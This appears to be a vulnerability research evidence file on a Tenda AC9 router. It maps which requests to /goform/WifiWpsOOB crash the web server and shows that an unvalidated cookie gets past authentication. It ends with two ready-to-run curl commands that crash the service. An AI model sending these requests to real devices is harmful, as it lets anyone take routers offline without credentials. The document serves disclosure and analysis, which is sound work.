# Evidence 04 — Trigger Matrix (Measured)

Device: Tenda AC9 v1.0, firmware `V15.03.05.19 (6318)`.
Method: one fresh container per case, so a previous crash cannot influence the next result.
Endpoint under test: `/goform/WifiWpsOOB`.

| # | Request | Response | httpd process |
|---|---|---|---|
| 1 | `POST` with empty body | *(timeout, no response)* | **crashed** (`exited 139`, SIGSEGV) |
| 2 | `POST` body `foo=1` (no `index`) | *(empty)* | **crashed** |
| 3 | `POST` body `index=` (empty value) | *(empty)* | **crashed** |
| 4 | `POST` body `index` (no `=`) | *(empty)* | **crashed** |
| 5 | `POST` body `index=1` | `HTTP/1.1 200 OK` | alive |
| 6 | **`GET`** method, no parameters | *(empty)* | **crashed** |
| 7 | `POST` **without** a cookie | `HTTP/1.0 302 Redirect` | alive (auth gate) |
| 8 | `POST` + `Cookie: password=zzz-almost-anything` | *(empty)* | **crashed** |
| 9 | `POST` with `Content-Length: 999` but a 5-byte body | *(timeout)* | alive (server waits for the rest) |

## Reading the matrix

- **Cases 1–4 and 6 all crash.** Every form of "the `index` parameter is not a non-empty
  value" reaches the defect: absent, present-but-empty, malformed, or simply a request
  with no body at all.
- **Case 5 returns `200 OK`.** A well-formed value is handled normally — the defect is
  not "the handler always crashes".
- **Cases 7 and 8 show the authentication gate.** Without a cookie the request is
  redirected before reaching the handler; **with a cookie whose value is never
  validated**, it reaches the handler. This makes the bug remotely reachable without
  credentials.
- **Case 9** shows a `Content-Length` mismatch does **not** trigger the bug — the server
  simply waits for the remainder of the body. (This also matters for interpreting fuzzing
  output: frame mismatch alone is not the cause.)

## Minimal request

```bash
# authenticated-equivalent form
curl -s "http://192.168.0.1/goform/WifiWpsOOB" -H "Cookie: password=x"

# or the equivalent minimal POST
curl -s -X POST "http://192.168.0.1/goform/WifiWpsOOB" \
     -H "Cookie: password=x" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "foo=1"
```

Observed effect: the connection is closed with no response, and subsequent connections are
refused until the device is restarted.

## Reproducing the matrix

Each row corresponds to a separate run of the emulated device. The script that drives this
is `scripts/trigger_matrix.py` in the analysis bundle; the essential logic is a single
socket write followed by reading whatever the peer sends back (or fails to send).
